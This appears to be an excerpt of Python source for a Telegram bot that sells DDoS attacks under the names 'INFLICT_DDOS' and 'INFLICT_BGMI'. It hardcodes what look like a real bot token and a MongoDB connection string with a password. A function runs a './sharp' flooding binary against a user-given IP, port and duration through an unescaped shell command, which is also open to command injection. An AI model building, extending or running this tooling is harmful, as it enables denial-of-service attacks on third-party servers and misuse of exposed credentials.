...
TOKEN = '8082959636:AAED8Gyu_Dngt0fJKeaR4U00tpy6GW5JU04'
MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'
FORWARD_CHANNEL_ID = -1002480978249
CHANNEL_ID = -1002480978249
error_channel_id = -1002480978249
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./sharp {target_ip} {target_port} {duration} 1")
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/INFLICT_DDOS/5*", parse_mode='Markdown')
        ...
        bot.reply_to(message, "*For Help Join Channel - @INFLICT_DDOS*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*Contact admin @INFLICT_BGMI*", parse_mode='Markdown')
    else:
